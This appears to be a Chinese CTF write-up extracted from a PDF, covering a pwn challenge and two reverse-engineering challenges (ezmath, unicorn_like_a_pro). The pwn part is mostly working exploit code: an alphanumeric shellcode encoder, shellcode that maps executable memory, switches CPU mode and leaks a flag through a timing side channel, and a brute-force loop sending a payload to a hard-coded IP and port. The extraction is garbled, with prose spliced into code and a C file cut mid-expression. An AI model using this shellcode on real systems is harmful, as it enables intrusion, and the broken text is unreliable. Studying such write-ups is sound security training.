        mul_word = (h 0:
          mul_word,mul_byte = self.find_mul_force(need-shift)
          if mul_word != 0: # find it
            self.mul_rdi = [mul_word,mul_byte]
            return (mul_word,mul_byte,shift)
    else: # 说明encoder已经设置了rdi，为了让shellcode尽量短，应尽量使⽤常数调整，⽽
不是重新设置rdi
      rdi = (self.mul_rdi[0]*self.mul_rdi[1])&0xffff
      if need-rdi in self.shift_tbl: # we find offset
        return (self.mul_rdi[0],self.mul_rdi[1],need-rdi)
      else: # not find :(
        for shift in self.shift_tbl:
          if need-shift > 0:
            mul_word,mul_byte = self.find_mul_force(need-shift)
            if mul_word != 0: # find it
              self.mul_rdi = [mul_word,mul_byte]
              return (mul_word,mul_byte,shift)
    print 'cant find mul for {} :('.format(need)
    exit(0)
  def gen_encoder(self,offset):
    '''
    根据函数encode_raw_sc得到的结果⽣成encoder
    '''
    sc =''
    old_rdi=[0,0]
    for raw_idx,regname,hl in self.encoder_info:
      idx = offset+raw_idx
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
      mul_word,mul_byte,shift = self.find_mul_add(idx)
      if mul_word == old_rdi[0] and mul_byte == old_rdi[1]: # edi not 
changed
        pass
      else:
        sc+='push {};push rsp;pop rcx;imul di,[rcx],
{};\n'.format(mul_byte,mul_word)
        old_rdi = self.mul_rdi
      if regname != 'rdx': #backup rdx and set
        sc+='push rdx;push {};pop rdx;\n'.format(regname)
      sc+='xor [rax+rdi+{}],{};\n'.format(shift,'dh' if hl else 'dl')
      if regname!= 'rdx': #restore rdx
        sc+='pop rdx;\n'
    return sc
def pwn(iii,v):
  # print '[+] this is the usage:'
  s1 = 
'6a01fe0c2468666c616789e331c931d26a0558cd80c704242500addec744240433000000c
b'.decode('hex')
  s2 = '''
  mov rdx,0xdead3f00
  mov rdx,qword ptr [rdx]
  jmp rdx
  '''
  f2 = s1+asm(s2)
  if len(f2) % 4 != 0:
    f2 += '\x90' *(4 -  len(f2) % 4)
  mov_ins = 'mov rdi,0xdead0000\n'
  for i in range(len(f2)/4):
    mov_ins += 'mov dword ptr [rdi + {0}],{1}\n'.format(i * 
4,u32(f2[i*4:i*4 + 4]))
  shsc = shellcraft.amd64.mmap(0xdead0000,0x4000,7,0x22,0,0) + mov_ins + 
'''
  mov rsp,0xdead3000
  call next11
  jmp ffff
  next11:
  pop rdi
  mov rsi,0xdead3f00
  mov qword ptr [rsi],rdi
  mov dword ptr [rsp], 0xdead0000
mov dword ptr [rsp + 4], 0x23
retf
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
ffff:
''' + (shellcraft.amd64.read('rax',0xdead2000,0x40) + '''
  sub rsi,0x30
  cmp byte ptr [rsi + {0}],{1}
  jnz crash
  next:
  jmp next
  crash:
  mov     eax, 0xE7
  syscall'''.format(iii + 0x30,hex(ord(v))))
  f1 = asm(shsc)
  obj = AE64()
  return obj.encode(f1,'rbx')
print(pwn(0,chr(0x30)))
print(pwn(1,chr(0x31)))
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
from pwn import *
ori = 
'SXWTYH39Yj0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZjATYfi9370t8ARARZ0T8FZ
RAPZ0T8IZ0T8J0t8K0t8L0t8M0t8N0T8ORAPZ0T8PZ0t8Q0t8R0T8SRARZ0T8TZ0t8V0T8X0t8Y
0t8Zj9TYfi9Uy0t8a0t8b0T8cRAPZ0T8dZ0t8e0t8g0t8hRAPZ0t8jZ0t8l0t8m0T8o0t8p0t8q
0T8rRARZ0T8sZ0t8t0t8u0t8v0t8wRAPZ0T8xZ0t8yjkTYfi95J0t8A0T8B0t8CRAPZ0T8DZ0t8
F0t8GRAPZ0T8KZRAPZ0t8MZ0T8PRAPZ0T8QZRAPZ0T8RZ0t8TRAPZ0T8VZRAPZ0T8XZRAPZ0T8Y
ZjITYfi99T0t8A0t8CRAPZ0T8EZRAPZ0T8FZ0t8H0T8IRAPZ0T8JZ0t8K0t8LRAPZ0T8MZ0t8O0
t8P0t8Q0T8RRARZ0T8SZRAPZ0T8TZ0t8VRAPZ0T8WZ0t8Y0t8ZjsTYfi9yzRAPZ0T8AZ0t8C0t8
E0t8F0t8GRAPZ0T8HZ0t8JRAPZ0T8KZ0T8M0t8NRAPZ0T8OZRAQZ0t8QZ0t8R0T8SRARZ0T8TZ0
t8URAPZ0T8VZ0t8X0t8Y0t8ZjcTYfi9GC0t8ARAPZ0T8CZ0T8F0t8G0T8HRAPZ0T8IZ0T8K0t8L
0T8NRARZ0T8OZ0t8P0t8Q0t8R0t8SRAPZ0T8TZ0t8U0t8V0t8W0t8XRAPZ0T8YZ0t8ZjUTYfi9S
ERAPZ0t8AZ0T8C0t8D0t8E0T8FRARZ0T8GZ0t8H0t8I0t8J0t8K0T8M0t8NRAPZ0T8OZ0t8P0t8
Q0t8R0t8S0T8TRARZ0T8UZRAPZ0T8VZ0t8X0t8Y0t8ZjiTYfi9AZ0t8A0t8B0t8CRAPZ0T8DZ0T
8FRAPZ0T8GZRARZ0T8IZRAPZ0t8KZ0T8M0t8N0t8O0t8P0t8Q0T8RRAPZ0T8SZ0t8T0t8U0T8VR
ARZ0T8WZ0t8X0t8YjETYfi9gU0T8ARAPZ0T8BZ0T8DRAPZ0t8EZ0t8IRAPZ0T8JZ0T8K0T8LRAP
Z0T8MZ0t8N0t8O0t8P0t8Q0t8RjwAZE1HE1IwTTTTIwTTdWjRZvTTTTIvTATTj9XZPHwUUeVUUU
UGRjT6YGGQqhflGG8agAcGGY1I1RGGEjPXMGGAHGQqGGMpUeVGGIGDqQGGu3UUUGGqKHrUGGqje
VUGGyUUUHGG0CG7bHtU0eVUUUUhWUUUkKoHvUjeVUUUUHAkGQqUUeVGDqQvUUUKHAG1HjpZvTTT
TIvTtdWZPHKn0HN{0}{1}uWk6pgUUUZP'
import string
flag = ''
for i in range(0,0x30):
  # ori = pwn(i,chr(0x30))
  for j in string.printable:
    p = remote('39.105.137.118',50050)
    s = ori.format(chr(i+0x30),j)
1
2
3
4
5
6
7
8
9
10
Reverse
ezmath
init ⾥⾯有⼀些奇怪的操作修改了判断函数中的 0.2021 的初始值，观察 init 中的操作发现
等⾃然对数
相关的级数求和，因此猜测最后函数的通项公式也与 相关。此外，对于
，如果
，则
;下⼀步就会变为 0，根据这样的观察我们可以猜测
，并且通过
⾮
常接近整数这⼀点来验证我们的猜测，继⽽还原出 flag.
    # print(s)
    p.sendline(s)
    try:
      sleep(0.1)
      p.send('123')
      p.send('123')
      p.send('123')
      sleep(0.1)
      p.send('123')
      p.recv(1000,timeout=0.1)
      flag += j
      print(flag)
      p.close()
      break
    except:
      pass
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
unicorn_like_a_pro
通过逆向把 unicorn 执⾏的指令提取出来，并从程序中提取出基本块的跳转顺序，根据这些信息恢复出正
常的控制流
逆向时发现 fs:0 对应的内存区域每读取⼀次都会 encode ⼀次，根据这些信息写出爆破脚本
import numpy as np
import math
import fuckpy3
res = [0.00009794904266317233, 0.00010270456917442, 0.00009194256152777895, 
0.0001090322021913372, 0.0001112636336217534, 0.0001007442677411854, 
0.0001112636336217534, 0.0001047063607908828, 0.0001112818534005219,
       0.0001046861985862495, 0.0001112818534005219, 0.000108992856167966, 
0.0001112636336217534, 0.0001090234561758122, 0.0001113183108652088, 
0.0001006882924839248, 0.0001112590796092291, 0.0001089841164633298, 
0.00008468431512187874]
flag = b''
for i in res:
    print(math.e/i)
    flag += hex(round(math.e/i)-2)[2:].unhex()[::-1]
print(flag)
print(len(flag))
1
2
3
4
5
6
7
8
9
10
11
12
13
#include 
#include 
#include 
uint64_t __ROL8__(uint64_t value, int count)
{
    const uint64_t nbits = 64;
    count %= nbits;
    uint64_t high = value >> (nbits - count);
    value  %p\n", testStr[i], subData[i]);
    }
    // 确定差值为 0x6e191
    // for (int i = 0; i < 4; ++i) {
    //     for (uint32_t j = 0; j != 0xffffffff; ++j) {
    //         uint32_t crc = data[1] - subData[i];
    //         if (crc == _mm_crc32_u32(0,j)) {
    //             uint32_t flag1 = j ^ (*(uint32_t*)&xorData[4]);
    //             printf("subData: %p, flag: %s\n", subData[i], &flag1);
    //         }
    //     }
    // }
    for (int i = 0; i < 8; ++i) {
        for (uint32_t j = 0; j != 0xffffffff; ++j) {
            uint32_t crc = data[i] - 0x6e191;
            if (crc == _mm_crc32_u32(0,j)) {
                uint32_t flag[2];
                flag[0] = j ^ (*(uint32_t*)&xorData[4*i]);
                flag[1] = 0;
                printf("flag:%s\n", &flag[0]);
                break;
            }
        }
    }
    return 0;
}
65
66
67
68
69
70
71
72